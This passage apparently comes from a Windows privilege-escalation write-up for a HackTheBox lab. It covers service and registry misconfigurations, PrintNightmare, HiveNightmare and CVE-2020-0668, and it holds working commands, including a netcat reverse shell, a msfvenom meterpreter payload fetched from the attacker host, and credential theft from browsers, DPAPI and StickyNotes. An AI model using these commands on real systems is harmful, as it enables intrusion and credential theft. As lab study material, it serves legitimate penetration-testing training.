<p><strong>⑤ Start the service</strong></p>
<pre><code>sc start SecurityService</code></pre>
<p>Function: To serve<strong>SYSTEM permissions</strong>Run, thereby executing malicious programs and gaining high privileges.</p>
<hr/>
<ol><li>Weak Service Permissions</li></ol>
<p><strong>concept</strong>: If an ordinary user has access to a Windows service<strong>SERVICE_ALL_ACCESS permission</strong>, the attacker can modify the service configuration (for example <code>binpath</code>), allowing the service to execute commands specified by the attacker when it starts, thereby gaining administrator privileges.</p>
<p><strong>Utilization steps</strong></p>
<p><strong>① Enumerate modifiable services</strong>: Automatic scanning system<strong>Service object with incorrect permission configuration</strong>.</p>
<pre><code>SharpUp.exe audit</code></pre>
<p><strong>② Check service permissions</strong>: Confirm whether the current user owns<strong>SERVICE_ALL_ACCESS</strong>.</p>
<pre><code>accesschk.exe /accepteula -quvcw WindscribeService</code></pre>
<p><strong>③ Modify service execution path</strong>: Replace the service execution path with a malicious command.</p>
<pre><code>sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"</code></pre>
<p><strong>④ Stop service</strong>: Ensure new configuration is loaded when the service is restarted.</p>
<pre><code>sc stop WindscribeService</code></pre>
<p><strong>⑤ Start the service</strong>: The system executes when trying to start the service <code>binpath</code> command in to add the current user to<strong>Administrators group</strong>.</p>
<pre><code>sc start WindscribeService</code></pre>
<p>****</p>
<ol><li>Unquoted Service Path (unquoted service path)</li></ol>
<p><strong>concept</strong>: If the service path contains spaces but is not wrapped in quotes, Windows will try multiple possible execution paths when parsing the path, and an attacker can place malicious programs in these paths to hijack service execution.</p>
<p><strong>Utilization steps</strong></p>
<p><strong>① Enumerate unquoted service paths</strong>: Find services that start automatically and whose path is not wrapped in quotes.</p>
<pre><code class="language-cmd">wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """</code></pre>
<p><strong>② View service configuration</strong>: Confirm the service path and running permissions.</p>
<pre><code class="language-cmd">sc qc SystemExplorerHelpService</code></pre>
<p><strong>③ Place malicious programs in exploitable paths</strong>: For example, create a malicious program:</p>
<pre><code class="language-cmd">C:\Program.exe</code></pre>
<p><strong>④ Wait for the service to start</strong>: Can be triggered by service restart or system restart.</p>
<p>Function: Windows will prioritize the execution of malicious programs placed by attackers, thereby<strong>SYSTEM permission to execute code</strong>.</p>
<hr/>
<ol><li>Permissive Registry ACLs (writable service registry)</li></ol>
<p><strong>concept</strong>: If ordinary users are interested in service-related<strong>Registry key has write permission</strong>, an attacker can modify the service's <code>ImagePath</code>, causing the service to execute malicious programs when it starts.</p>
<p><strong>Utilization steps</strong></p>
<p><strong>① Enumerate service registry permissions</strong>: Find service registry keys that have write permissions.</p>
<p>accesschk.exe /accepteula "username" -kvuqsw hklm\System\CurrentControlSet\services</p>
<p><strong>② Modify service execution path</strong>: will <code>ImagePath</code> Modified to an attacker-controlled program.</p>
<pre><code class="language-PowerShell">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name ImagePath -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"</code></pre>
<p><strong>③ Start service</strong></p>
<pre><code class="language-cmd">sc start ModelManagerService</code></pre>
<p>Function: When the service starts, it will execute a new <code>ImagePath</code>, thus<strong>Run attack code with SYSTEM privileges</strong>.</p>
<hr/>
<ol><li>Modifiable Registry Autorun Binary (modifiable startup item program)</li></ol>
<p><strong>concept</strong>: Windows will automatically execute certain programs when the system starts or when the user logs in. If an attacker can modify the programs or paths corresponding to these startup items, he can execute malicious code when the user logs in to achieve privilege escalation.</p>
<p><strong>Utilization steps</strong></p>
<p><strong>① Enumerate system startup items</strong>: View the programs that run automatically when the system and user log in.</p>
<pre><code class="language-PowerShell">Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl</code></pre>
<p><strong>② Check the startup program permissions</strong>: Confirm whether the program can be modified or replaced.</p>
<pre><code>icacls &lt;startup program path&gt;</code></pre>
<p>③ Replace the startup program: Replace the original file with a program controlled by the attacker.</p>
<p>④ Wait for user login or system startup</p>
<p>Function: When the corresponding user logs in or the system starts, Windows will automatically execute malicious programs to obtain higher privileges.</p>
<h2>Kernel Exploits</h2>
<p>On this HTB Windows privilege escalation lab machine, this section walks through three example paths, raises access to <code>NT AUTHORITY\SYSTEM</code>, and then reads the flag from the Administrator desktop.</p>
<p>The three examples are:</p>
<ol><li><strong>HiveNightmare / SeriousSam</strong></li></ol>
<ul><li>Read <code>SAM</code>, <code>SYSTEM</code>, and <code>SECURITY</code> from a shadow copy as a low-privileged user.</li><li>Extract local account hashes offline.</li><li>Reuse the hashes to obtain elevated access.</li></ul>
<ol><li><strong>PrintNightmare</strong></li></ol>
<ul><li>Exploit the Print Spooler service vulnerability.</li><li>Add a local administrator user directly, or execute a malicious DLL.</li><li>Switch into the elevated context afterward.</li></ul>
<ol><li><strong>CVE-2020-0668 + Mozilla Maintenance Service</strong></li></ol>
<ul><li>Abuse an arbitrary file move vulnerability.</li><li>Place an attacker-controlled executable in a <code>SYSTEM</code> service path.</li><li>Start the service to obtain a <code>SYSTEM</code> shell.</li></ul>








<h3>1. Print Nightmare</h3>
<h4>First check whether the Spooler print background service is turned on</h4>
<p>In target machine PowerShell:</p>
<pre><code>ls \\localhost\pipe\spoolss</code></pre>
<p>If you see <code>spoolss</code>, indicating that the printing service is running and you can continue.</p>
<hr/>
<h4>Bypass execution policy</h4>
<pre><code class="language-PowerShell">Set-ExecutionPolicy Bypass -Scope Process</code></pre>
<p>input <code>A</code> Confirm.</p>
<hr/>
<h4>Import the script and add the admin user</h4>
<p>Assume that the question environment has already given <code>CVE-2021-1675.ps1</code>, execute:</p>
<pre><code class="language-PowerShell">Import-Module C:\Tools\CVE-2021-1675.ps1 Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"</code></pre>
<p>When successful, you will generally see something like:</p>
<ul><li>created payload</li></ul>
<ul><li>added user hacker as local administrator</li></ul>
<hr/>
<h4>Verify new user</h4>
<pre><code class="language-cmd">net user hacker</code></pre>
<p>Or:</p>
<pre><code class="language-cmd">net localgroup administrators</code></pre>
<hr/>
<h4>Get an admin shell using a new user</h4>
<p>If RDP is allowed, log in again:</p>
<ul><li>User:<code>hacker</code></li></ul>
<ul><li>Password:<code>Pwnd1234!</code></li></ul>
<p>Or try this in the current session:</p>
<pre><code class="language-cmd">runas /user:hacker cmd</code></pre>
<p>Then enter your password.</p>
<hr/>
<h4>Then upgrade to high integrity shell</h4>
<p>If you are only in the Administrators group but still have medium integrity, execute:</p>
<pre><code class="language-PowerShell">Start-Process cmd -Verb RunAs</code></pre>
<p>Just click UAC.</p>
<hr/>
<h4>read flag</h4>
<pre><code class="language-cmd">type C:\Users\Administrator\Desktop\flag.txt</code></pre>
<p>If the file name is not this, first:</p>
<pre><code class="language-cmd">dir C:\Users\Administrator\Desktop</code></pre>
<hr/>
<h3>2. HiveNightmare/SeriousSam</h3>
<p>The essence of this example is:<strong>Read registry shadow copy with low permissions -&gt; export hive -&gt; extract hash offline</strong>.</p>
<hr/>
<h4>Check SAM file permissions</h4>
<pre><code class="language-cmd">icacls C:\Windows\System32\config\SAM</code></pre>
<p>You need to see if there is anything similar to:</p>
<pre><code>BUILTIN\Users:(I)(RX)</code></pre>
<p>If there is, it means there is a play.</p>
<hr/>
<h4>Run HiveNightmare</h4>
<p>Assuming the tool is already on the desktop or in the tools directory:</p>
<pre><code class="language-cmd">.\HiveNightmare.exe</code></pre>
<p>Normally it will spit out:</p>
<ul><li><code>SAM-xxxx-xx-xx</code></li></ul>
<ul><li><code>SYSTEM-xxxx-xx-xx</code></li></ul>
<ul><li><code>SECURITY-xxxx-xx-xx</code></li></ul>
<hr/>
<h4>Send the file back to the attacker machine</h4>
<p>Enable HTTP or SMB reception on the attacker machine, or drag it out directly through RDP. If you are on Kali, use impacket to parse:</p>
<pre><code class="language-shell">impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local</code></pre>
<hr/>
<h4>What to do with the hash after you get it</h4>
<p>If you see an administrator or other high-privilege account hash, you can try:</p>
<ul><li>Local PTH (some scenarios)</li></ul>
<ul><li>SMB / WinRM / PsExec</li></ul>
<ul><li>Or reuse with clear text password</li></ul>
<p>But this step is not necessarily the smoothest route in this question. So you should think of this part more as:</p>
<p><strong>"Verify that this vulnerability can be exploited"</strong>.</p>
<p>If the question requires "try out 3 examples", if you export hive and get the hash, you will basically have completed the example.</p>
<hr/>
<h3>3. CVE-2020-0668 and Mozilla Maintenance Service privilege escalation chain</h3>
<p>This is the chain most similar to "standard SYSTEM privilege escalation" in this section.</p>
<h4>First confirm that the current permissions are not high</h4>
<pre><code class="language-cmd">whoami /priv</code></pre>
<p>Generally you will see that you only have ordinary user rights.</p>
<hr/>
<h4>Check Mozilla Maintenance Service binary file permissions</h4>
<pre><code class="language-cmd">icacls "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"</code></pre>
<p>Normally to start you should only have:</p>
<pre><code>BUILTIN\Users:(I)(RX)</code></pre>
<p>That is, it can only be read and executed, not written.</p>
<hr/>
<h4>Generate malicious EXE on the attacker machine</h4>
<p>If you use msfvenom:</p>
<pre><code class="language-shell">msfvenom -p windows/x64/meterpreter/reverse_https LHOST=&lt;VPN_IP&gt; LPORT=8443 -f exe &gt; maintenanceservice.exe</code></pre>
<hr/>
<h4>Enable HTTP service on the attacker machine</h4>
<pre><code class="language-shell">python3 -m http.server 8080</code></pre>
<hr/>
<h4>Download two malicious EXEs on the target machine</h4>
<p>PowerShell: </p>
<pre><code class="language-PowerShell">wget http://&lt;VPN_IP&gt;:8080/maintenanceservice.exe -O C:\Users\htb-student\Desktop\maintenanceservice.exe
wget http://&lt;VPN_IP&gt;:8080/maintenanceservice.exe -O C:\Users\htb-student\Desktop\maintenanceservice2.exe</code></pre>
<p>Why two copies? Because the first copy will be "corrupted" during the exploit process, the second copy is a backup clean version.</p>
<hr/>
<h4>Running CVE-2020-0668</h4>
<p>Assume the exploit is in <code>C:\Tools\CVE-2020-0668\</code>: </p>
<pre><code class="language-cmd">C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\Users\htb-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"</code></pre>
<p>If the output contains:</p>
<ul><li><code>Moving...</code></li></ul>
<ul><li><code>Creating symbol links</code></li></ul>
<ul><li><code>Updating... Tracing...</code></li></ul>
<ul><li><code>Done!</code></li></ul>
<p>The explanation is generally successful.</p>
<hr/>
<h4>Check the target file permissions again</h4>
<pre><code class="language-cmd">icacls "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"</code></pre>
<p>At this point you should see that your users have:</p>
<pre><code>(F)</code></pre>
<p>That is Full Control.</p>
<hr/>
<h4>Overwrites the target service file with a second clean malicious EXE</h4>
<p>Note that this step must be<strong>cmd.exe</strong> Executed in PowerShell, not PowerShell.</p>
<pre><code class="language-cmd">copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"</code></pre>
<hr/>
<h4>Start the Metasploit handler on the attacker machine</h4>
<p>Write one first <code>handler.rc</code>: </p>
<pre><code>use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST &lt;VPN_IP&gt;
set LPORT 8443
exploit</code></pre>
<p>Start:</p>
<pre><code class="language-shell">sudo msfconsole -r handler.rc</code></pre>
<hr/>
<h4>Start the Mozilla Maintenance service</h4>
<p>Target machine executes:</p>
<pre><code class="language-cmd">net start MozillaMaintenance</code></pre>
<p>Even if an error is reported:</p>
<pre><code>The service is not responding to the control function</code></pre>
<p>Don't panic, this kind of error is often just "the service is not working properly, but the payload has been executed" in this type of questions.</p>
<hr/>
<h4>Get the SYSTEM session in msfconsole</h4>
<p>It usually bounces back after success:</p>
<pre><code>Meterpreter session opened...</code></pre>
<p>Go in and confirm:</p>
<pre><code>getuid</code></pre>
<p>What you want to see is:</p>
<pre><code>NT AUTHORITY\SYSTEM</code></pre>
<hr/>
<h4>Last read flag</h4>
<p>If you are in meterpreter:</p>
<pre><code>shell
type C:\Users\Administrator\Desktop\flag.txt</code></pre>
<p>If the file name is wrong:</p>
<pre><code class="language-cmd">dir C:\Users\Administrator\Desktop</code></pre>
<h2>Credential theft</h2>
<h3>Search</h3>
<p>Against best practices, applications often store passwords in clear text configuration files. Suppose we get command execution in the context of an unprivileged user account. In this case, we may be able to find credentials for their administrator account or other privileged local or domain account. we can use<a href="https://ss64.com/nt/findstr.html" rel="noreferrer" target="_blank">findstr</a> Tools to search for this sensitive information.</p>
<ol><li><strong>Application configuration file</strong></li></ol>
<pre><code>PS C:\htb&gt; findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml</code></pre>
<p>Sensitive IIS information, such as credentials, may be stored in <code>web.config</code> in the file. For the default IIS website, this address might be in <code>C: \inetpub\wwwroot\web.config</code>, but the file may have multiple versions in different locations, which we can search for recursively.</p>
<ol><li><strong>dictionary file</strong></li></ol>
<p>Another interesting example is dictionary files. For example, sensitive information such as passwords may be entered into email clients or browser-based applications that underline unrecognized words. Users can add these words to the dictionary to avoid distracting red underlines.</p>
<pre><code class="language-PowerShell">PS C:\htb&gt; gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password 

Password1234!</code></pre>
<p>There may be automatic login settings defined or additional accounts that need to be created during installation.<code>unattend.xml</code> Passwords in are stored in clear text or base64 encoding.</p>
<ol><li><strong>Unattended installation files</strong></li></ol>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;unattend xmlns="urn:schemas-microsoft-com:unattend"&gt;
    &lt;settings pass="specialize"&gt;
        &lt;component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
            &lt;AutoLogon&gt;
                &lt;Password&gt;
                    &lt;Value&gt;local_4dmin_p@ss&lt;/Value&gt;
                    &lt;PlainText&gt;true&lt;/PlainText&gt;
                &lt;/Password&gt;
                &lt;Enabled&gt;true&lt;/Enabled&gt;
                &lt;LogonCount&gt;2&lt;/LogonCount&gt;
                &lt;Username&gt;Administrator&lt;/Username&gt;
            &lt;/AutoLogon&gt;
            &lt;ComputerName&gt;*&lt;/ComputerName&gt;
        &lt;/component&gt;
    &lt;/settings&gt;</code></pre>
<p>Although these files should be automatically deleted as part of the installation, system administrators may have created copies of this file in other folders when making the image and reply files.</p>
<p>Starting with PowerShell 5.0 on Windows 10, PowerShell stores command history in the following files:</p>
<ol><li><strong>PowerShell history file</strong></li></ol>
<ul><li><code>C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code>.</li></ul>
<p>As seen in the (handy) Windows Commands PDF published by Microsoft, there are many commands that can pass credentials at the command line. As you can see in the example below, the user specifies local administrative credentials using<a href="https://ss64.com/nt/wevtutil.html" rel="noreferrer" target="_blank">wevutil</a> Query the application event log.</p>
<ul><li>Confirm PowerShell history save path</li></ul>
<pre><code>PS C:\htb&gt; (Get-PSReadLineOption).HistorySavePath

C:\Users\htb-student\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></pre>
<p>Once we know the location of the file (the default path is above) we can try using <code>gc</code> Read its contents.</p>
<ul><li>Read the PowerShell history file</li></ul>
<pre><code class="language-PowerShell">PS C:\htb&gt; gc (Get-PSReadLineOption).HistorySavePath 
dir 
cd Temp 
md backups 
cp c:\inetpub\wwwroot\*.\backups\ 
Set-ExecutionPolicy Bypass -Scope Process -Force; 
[System.Net.ServicePointManager]::SecurityProtocol = 
[System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://www.PowerShellgallery.com/packages/MrAToolbox/1.0.1/Content/Get-IISSite.ps1'))..\Get-IISsite.ps1 Get-IISsite -Server WEB02 -web "Default Web Site" 
wevtutil qe Application "/q:*[Application [(EventID=3005)]]" /f:text /rd:true 
/u:WEB02\administrator /p:5erv3rAdmin! /r:WEB02</code></pre>
<p>We can also use this sentence to retrieve the contents of all PowerShell history files that the current user has access to. This is also very helpful after an exploit. If our previous access rights were unable to read certain users' files, we should recheck those files after gaining local admin. This command assumes the default archive path is used.</p>
<pre><code>PS C:\htb&gt;foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}

dir
cd Temp
md backups
cp c:\inetpub\wwwroot\*.\backups\
Set-ExecutionPolicy Bypass -Scope Process -Force;
[System.Net.ServicePointManager]::SecurityProtocol = 
[System.Net.ServicePointManager]::SecurityProtocol -bor 3072;
iex ((New-Object System.Net.WebClient).DownloadString('https://www.PowerShellgallery.com/packages/MrAToolbox/IISSite.ps1')).\Get-IISSite.ps1
Get-IISsite -Server WEB02 -web "Default Web Site"

wevtutil qe Application "/q:*[Application [(EventID=3005)]]" /f:text /rd:true /u:WEB02\administrator /p:5erv3rAdmin! /r:WEB02</code></pre>
<p>Credentials are often used in scripting and automation tasks to conveniently store encrypted credentials. Credentials passed<a href="https://en.wikipedia.org/wiki/Data_Protection_API" rel="noreferrer" target="_blank">DPAPI</a> Protection, usually means that only the same user on the same computer that created them can decrypt them.</p>
<ol><li><strong>PowerShell credentials</strong></li></ol>
<p>For example, the following script <code>Connect-VC.ps1</code>, a system administrator created it to facilitate connection to vCenter Server.</p>
<pre><code># Connect-VC.ps1
# Get-Credential | Export-Clixml -Path 'C:\scripts\pass.xml'
$encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $decryptedPassword</code></pre>
<p>Decrypting PowerShell Credentials If we gain command execution in the background of this user, or are able to abuse DPAPI, then we can <code>encrypted.xml</code> Recover clear text credentials. The examples below assume the former.</p>
<pre><code>PS C:\htb&gt; $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
PS C:\htb&gt; $credential.GetNetworkCredential().username

bob


PS C:\htb&gt; $credential.GetNetworkCredential().password

Str0ng3ncryptedP@ss!</code></pre>
<h3>Other documents</h3>
<p>There are many other types of files that we can find on the local system or network shared drives that may contain credentials or information that can be used for privilege escalation. In an Active Directory environment, we can use a tool like Snaffler to scan network shares for interesting file extensions such as.kdbx,.vmdk,.vdhx,.ppk, etc. We might find a virtual hard drive that can be mounted and extract the local administrator password hash, or an SSH private key that can be used to access other systems, or the user has passwords stored in an Excel/Word document, OneNote, or the classic passwords.txt file. In many penetration tests, a password found on a shared or local drive is sufficient to achieve initial access or privilege escalation. Many companies assign each employee a shared folder (such as the user directory bjones on FILE01) and set loose permissions (such as readable by all domain users). Users often store sensitive information in these folders without knowing that the data is visible to the entire network.</p>
<p><strong>Manually search the file system for credentials</strong></p>
<p>We can manually search the contents of a file system or shared drive using the following command.</p>
<pre><code>C:\htb&gt; cd c:\Users\htb-student\Documents &amp; findstr /SI /M "password" *.xml *.ini *.txt

stuff.txt
</code></pre>
<p>Example 2:</p>
<pre><code>C:\htb&gt; findstr /si password *.xml *.ini *.txt *.config

stuff.txt:password: l#-x9r11_2_GL!</code></pre>
<p>Example 3:</p>
<pre><code>C:\htb&gt; findstr /spin "password" _._
 
stuff.txt:1:password: l#-x9r11_2_GL!</code></pre>
<p><strong>Search file contents using PowerShell</strong> We can also search in a variety of ways using PowerShell, here is an example:</p>
<pre><code>PS C:\htb&gt; select-string -Path C:\Users\htb-student\Documents*.txt -Pattern password

stuff.txt:1:password: l#-x9r11_2_GL!</code></pre>
<p>Search for a specific file extension - Example 1:</p>
<pre><code>C:\htb&gt; dir /S /B _pass_.txt == _pass_.xml == _pass_.ini == _cred_ == _vnc_ == _.config_

c:\inetpub\wwwroot\web.config</code></pre>
<p>Search for a specific file extension - Example 2:</p>
<pre><code>C:\htb&gt; where /R C:\ *.config

c:\inetpub\wwwroot\web.config</code></pre>
<p>Similarly, we can also search for files with a specific extension using the following command:</p>
<pre><code>PS C:\htb&gt; Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore</code></pre>
<p><strong>Passwords in Sticky Notes</strong></p>
<p>People often use the StickyNotes app for Windows to save passwords and other information without knowing that it is actually a database file. The file is located at:</p>
<pre><code>PS C:\htb&gt; Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore


    Directory: C:\inetpub\wwwroot


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/25/2021   9:59 AM            329 web.config

&lt;SNIP&gt;




    Directory: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ASP.NETWebAdminFiles


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         12/7/2019   1:12 AM           1040 web.config
</code></pre>
<p><strong>Find StickyNotes database files:</strong> People often use the StickyNotes app on Windows workstations to save passwords and other information without realizing that it is a database file. This file is located at,<code>C:\Users\&lt;user&gt;\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite</code> Worth searching and checking.</p>
<ul><li>Find sticky notes database file</li></ul>
<pre><code>PS C:\htb&gt; ls
 
 
    Directory: C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState
 
 
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/25/2021  11:59 AM          20480 15cbbc93e90a4d56bf8d9a29305b8981.storage.session
-a----         5/25/2021  11:59 AM            982 Ecs.dat
-a----         5/25/2021  11:59 AM           4096 plum.sqlite
-a----         5/25/2021  11:59 AM          32768 plum.sqlite-shm
-a----         5/25/2021  12:00 PM         197792 plum.sqlite-wal</code></pre>
<p>We can put three <code>plum.sqlite*</code> Copy the file to the system, open it with SQLite tools such as DB browser, and query <code>select Text from Note;</code> View the Note table <code>Text</code> columns.</p>
<img alt="Pasted image 20260322052414" src="assets/posts/windows-privilege-escalation/Pasted image 20260322052414.png"/>
<p><strong>View note data using PowerShell</strong> This can also be done using the PSSQLite module for PowerShell. First, import the module, point to a data source (here refers to the SQLite database file used by the StickNotes application), and finally query <code>Note</code> table, looking for any interesting data. This can also be downloaded on our attacker machine <code>.sqlite</code> Completed after the file, or remotely via WinRM.</p>
<pre><code class="language-PowerShell">PS C:\htb&gt; Set-ExecutionPolicy Bypass -Scope Process

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic at
https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A

PS C:\htb&gt; cd.\PSSQLite\
PS C:\htb&gt; Import-Module.\PSSQLite.psd1
PS C:\htb&gt; $db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
PS C:\htb&gt; Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
 
Text
----
\id=de368df0-6939-4579-8d38-0fda521c9bc4 vCenter
\id=e4adae4c-a40b-48b4-93a5-900247852f96
\id=1a44a631-6fff-4961-a4df-27898e9e1e65 root:Vc3nt3R_adm1n!
\id=c450fc5f-dc51-4412-b4ac-321fd41c522a Thycotic demo tomorrow at 10am</code></pre>
<p><strong>String used to view the contents of the database file</strong> We can also copy them to the attack box with <code>string</code> The command searches the data, which may be less efficient depending on the database size.</p>
<pre><code class="language-PowerShell">Chenduoduo@htb[/htb]$  strings plum.sqlite-wal

CREATE TABLE "Note" (
"Text" varchar,
"WindowPosition" varchar,
"IsOpen" integer,
"IsAlwaysOnTop" integer,
"CreationNoteIdAnchor" varchar,
"Theme" varchar,
"IsFutureNote" integer,
"RemoteId" varchar,
"ChangeKey" varchar,
"LastServerVersion" varchar,
"RemoteSchemaVersion" integer,
"IsRemoteDataInvalid" integer,
"PendingInsightsScan" integer,
"Type" varchar,
"Id" varchar primary key not null,
"ParentId" varchar,
"CreatedAt" bigint,
"DeletedAt" bigint,
"UpdatedAt" bigint )'
indexsqlite_autoindex_Note_1Note
af907b1b-1eef-4d29-b238-3ea74f7ffe5caf907b1b-1eef-4d29-b238-3ea74f7ffe5c
U   af907b1b-1eef-4d29-b238-3ea74f7ffe5c
Yellow93b49900-6530-42e0-b35c-2663989ae4b3af907b1b-1eef-4d29-b238-3ea74f7ffe5c
U   93b49900-6530-42e0-b35c-2663989ae4b3


&lt; SNIP &gt;

\id=011f29a4-e37f-451d-967e-c42b818473c2 vCenter
\id=34910533-ddcf-4ac4-b8ed-3d1f10be9e61 alright*
\id=ffaea2ff-b4fc-4a14-a431-998dc833208c root:Vc3nt3R_adm1n!ManagedPosition=Yellow93b49900-6530-42e0-b35c-2663989ae4b3af907b1b-1eef-4d29-b238-3ea74f7ffe5c

&lt;SNIP &gt;</code></pre>
<p><strong>Other related files</strong> We may also find credentials in the following files:</p>
<pre><code class="language-shellsession">%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*</code></pre>
<h3>Further credential theft</h3>
<p>List saved credentials<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey" rel="noreferrer" target="_blank">cmdkey</a> Commands can be used to create, list, and delete stored usernames and passwords. Users may want to store credentials for a specific host, or for a Terminal Services connection, in order to connect to a remote host through Remote Desktop without entering a password. This might help us migrate laterally to a system with different users, or escalate the privileges of the current host to leverage the credentials stored by other users.</p>
<ol><li><strong>Cmdkey saved credentials</strong></li></ol>
<pre><code>C:\htb&gt; cmdkey /list

    Target: LegacyGeneric:target=TERMSRV/SQL01
    Type: Generic
    User: inlanefreight\bob</code></pre>
<p>The saved credentials are used when we try to RDP access to the host.</p>
<img alt="Pasted image 20260322055123" src="assets/posts/windows-privilege-escalation/Pasted image 20260322055123.png"/>
<p>We can also try using <code>runas</code> Reuse the credentials to send a reverse shell as that user, run the binary, or launch a PowerShell or CMD console with:</p>
<p>Execute commands as other users</p>
<pre><code>PS C:\htb&gt; runas /savecred /user:inlanefreight\bob "COMMAND HERE"</code></pre>
<p>Get saved credentials from Chrome Users often store credentials in their browser for applications they frequently access. We can use something like<a href="https://github.com/GhostPack/SharpDPAPI" rel="noreferrer" target="_blank">SharpChrome</a> Tools like this get cookies and saved login information from Google Chrome.</p>
<ol><li><strong>Browser Credentials browser credentials</strong></li></ol>
<pre><code>PS C:\htb&gt;.\SharpChrome.exe logins /unprotect

  __                 _
 (_  |_   _.._._  /  |_._ _._ _   _
 __) | | (_| |  |_) \_ | | | (_) | | | (/_
                |
  v1.7.0


[*] Action: Chrome Saved Logins Triage

[*] Triaging Chrome Logins for current user



[*] AES state key file: C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State
[*] AES state key: 5A2BF178278C85E70F63C4CC6593C24D61C9E2D38683146F6201B32D5B767CA0


--- Chrome Credential (Path: C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data) ---

file_path,signon_realm,origin_url,date_created,times_used,username,password
C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data,https://vc01.inlanefreight.local/,https://vc01.inlanefreight.local/ui,4/12/2021 5:16:52 PM,13262735812597100,bob@inlanefreight.local,Welcome1</code></pre>
<p>Note: Chromium-based browsers collecting credentials often generate additional events that blue teams can log and identify, such as <code>4688</code>(process creation) and <code>16385</code>(DPAPI activity); defenders may also consider file system/object access events such as <code>4662</code>(object access) and <code>4663</code>(file access) to improve detection accuracy.</p>
<p>Many companies offer password managers to users. This can be a desktop application such as <code>KeePass</code>, cloud solutions such as <code>1Password</code>, or an enterprise password library such as <code>Thycotic</code> or <code>CyberArk</code>. Gaining access to a password manager, especially one used by IT staff or an entire department, can lead to administrator-level access to high-value targets such as network devices, servers, databases, etc. We may gain access to the password vault through password reuse or guessing weak/common passwords. Some password managers such as <code>KeePass</code>, stored locally on the host. If we find it on a server, workstation or file share.<code>kdbx</code> file, you will know that what we are facing is <code>KeePass</code> Databases are usually protected only by a master password. If we can download to the attack host <code>.kdbx</code> file, you can use<a href="https://gist.githubusercontent.com/HarmJ0y/116fa1b559372804877e604d7d367bbc/raw/c0c6f45ad89310e61ec0363a69913e966fe17633/keepass2john.py" rel="noreferrer" target="_blank">keepass2john</a> Tools such as this extract password hashes and use password cracking tools such as<a href="https://github.com/hashcat" rel="noreferrer" target="_blank">Hashcat</a> or<a href="https://github.com/openwall/john" rel="noreferrer" target="_blank">John the Ripper</a> for processing.</p>
<ol><li><strong>Password Managers Password Managers</strong></li></ol>
